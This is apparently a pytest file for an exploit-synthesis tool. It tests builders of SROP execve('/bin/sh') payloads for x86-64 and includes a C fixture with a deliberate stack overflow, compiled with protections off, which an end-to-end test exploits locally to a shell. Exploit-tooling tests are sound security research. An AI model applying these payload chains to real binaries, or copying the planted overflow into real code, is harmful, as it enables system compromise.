"""SROP (sigreturn-oriented programming) synthesis primitives for static/no-PIE x86-64."""
import struct

from lykos.analyze.poc import rop


def test_sigreturn_frame_amd64_layout():
    f = rop.sigreturn_frame(rip=0xdeadbeef, rax=59, rdi=0x1234, rsi=0, rdx=0, rsp=0x7fff)
    assert len(f) == 248
    at = lambda o: struct.unpack_from("<Q", f, o)[0]
    assert at(0x68) == 0x1234       # rdi
    assert at(0x90) == 59           # rax
    assert at(0xA0) == 0x7fff       # rsp
    assert at(0xA8) == 0xdeadbeef   # rip
    assert at(0xB8) == 0x33         # csgsfs (cs=0x33 for 64-bit user)


def test_build_srop_execve_structure():
    # cyclic(offset) then pop_rax, 15, syscall, then the 248-byte frame.
    payload = rop.build_srop_execve(40, syscall=0x401014, binsh=0x404000, length=512,
                                    pop_rax=0x401234, rsp=0x404200)
    assert len(payload) >= 40 + 24 + 248
    at = lambda o: struct.unpack_from("<Q", payload, o)[0]
    assert at(40) == 0x401234       # pop rax ; ret
    assert at(48) == 15             # rt_sigreturn number
    assert at(56) == 0x401014       # syscall gadget
    frame = payload[64:64 + 248]
    assert struct.unpack_from("<Q", frame, 0x90)[0] == 59        # rax=execve
    assert struct.unpack_from("<Q", frame, 0x68)[0] == 0x404000  # rdi=&"/bin/sh"


def test_srop_feasible_reports_pieces():
    # a syscall;ret gadget with no pop-rax / writable / binsh -> feasible shape, missing pieces
    blob = b"\x7fELF\x02\x01\x01" + b"\x00" * 57
    feo = rop.srop_feasible(blob)
    assert set(feo) == {"syscall", "pop_rax", "writable", "binsh"}


# --- 2-stage SROP that PLANTS "/bin/sh" (no /bin/sh in the image) --------------------------------
import shutil  # noqa: E402
import subprocess  # noqa: E402

import pytest  # noqa: E402
from lykos.analyze.dynamic import sandbox  # noqa: E402


def test_build_srop_execve_plant_structure():
    s1, s2 = rop.build_srop_execve_plant(40, syscall=0x401128, pop_rax=0x401126, writable=0x404040)
    q = lambda b, o: struct.unpack_from("<Q", b, o)[0]
    # stage1: cyclic(40) + (pop rax;15;syscall) + a read-frame that pivots rsp INTO `writable`
    assert q(s1, 40) == 0x401126 and q(s1, 48) == 15 and q(s1, 56) == 0x401128
    f1 = s1[64:64 + 248]
    assert q(f1, 0x90) == 0 and q(f1, 0x70) == 0x404040 and q(f1, 0xA0) == 0x404040  # rax=0,rsi,rsp
    # stage2: (pop rax;15;syscall) + an execve-frame; "/bin/sh" planted at +0x120
    assert q(s2, 0) == 0x401126 and q(s2, 8) == 15 and q(s2, 16) == 0x401128
    f2 = s2[24:24 + 248]
    assert q(f2, 0x90) == 59 and q(f2, 0x68) == 0x404040 + 0x120                     # execve, rdi
    assert s2[0x120:0x128] == b"/bin/sh\x00"


_SROP_DYN = r"""
#include <unistd.h>
long scratch[256];                                   /* writable .bss to plant into */
__asm__(".text\n"
        ".global g_pop_rax\n g_pop_rax: pop %rax\n ret\n"
        ".global g_syscall\n g_syscall: syscall\n ret\n");
void vuln(void){ char b[32]; read(0, b, 512); }      /* stack overflow */
int main(void){ vuln(); return 0; }
"""


@pytest.fixture
def pool(store):
    from lykos.analyze import register
    from lykos.jobs import JobConfig, WorkerPool
    register()
    p = WorkerPool(store.db_path, store.content, JobConfig(workers=2, poll_interval=0.02))
    p.start()
    try:
        yield p
    finally:
        p.stop(grace=3.0)


@pytest.fixture
def srop_bin(tmp_path_factory):
    if sandbox.host_arch() != "x86-64":
        pytest.skip("SROP synthesis is x86-64 native only")
    gcc = shutil.which("gcc") or shutil.which("cc")
    if not gcc:
        pytest.skip("no C compiler")
    d = tmp_path_factory.mktemp("srop"); c = d / "m.c"; c.write_text(_SROP_DYN)
    out = d / "target.bin"
    if subprocess.run([gcc, "-no-pie", "-fno-stack-protector", "-fcf-protection=none",
                       str(c), "-o", str(out)], capture_output=True).returncode != 0:
        pytest.skip("cannot build SROP fixture")
    return out


def test_find_writable_targets_bss_not_segment_start(srop_bin):
    """find_writable returns a .bss address (past p_filesz), not the RW segment start that holds
    .dynamic/.got/.data (planting there corrupts the loader)."""
    wr = rop.find_writable(srop_bin.read_bytes())
    assert wr is not None
    got = [ln for ln in subprocess.run(["readelf", "-S", str(srop_bin)], capture_output=True,
                                        text=True).stdout.splitlines() if ".bss" in ln]
    if got:
        bss_addr = int(got[0].split()[3] if got[0].split()[3][0].isdigit()
                       or True else got[0].split()[4], 16)
        assert wr[0] >= bss_addr - 0x40      # lands in (or just before) the .bss, not .dynamic/.got


def test_srop_execve_plant_detonates_l3(store, case, pool, srop_bin):
    """End-to-end: a no-PIE binary with a writable segment + pop-rax + syscall but NO /bin/sh is
    exploited to a CONFIRMED L3 SROP execve (a shell spawns and echoes our marker)."""
    from lykos.analyze.ingest import enqueue_triage, ingest
    from lykos.db.dao import PocDAO, TargetDAO
    from lykos.jobs import JobQueue
    t = ingest(store, case.id, srop_bin, filename="m")
    q = JobQueue(store.conn)
    enqueue_triage(q, t, force=True); assert pool.wait_idle(30)
    # triage's tool-based arch detection can miss a tiny asm-heavy binary; the SROP synthesis is
    # what's under test, so pin the denorm fields it gates on.
    TargetDAO(store.conn).update_triage(t.id, arch="x86-64", bits=64, endianness="little",
                                        linking="dynamic", stripped=False,
                                        mitigations={"pie": "off"}, file_type="elf")
    run = enqueue_exploit_or_skip(q, t)
    assert pool.wait_idle(60) and q.runs.get(run.id).status == "done"
    assert any(pc.level == "L3" and pc.verified for pc in PocDAO(store.conn).list_by_target(t.id))


def enqueue_exploit_or_skip(q, t):
    from lykos.analyze.poc import enqueue_exploit
    return enqueue_exploit(q, t, params={"offset": 40})
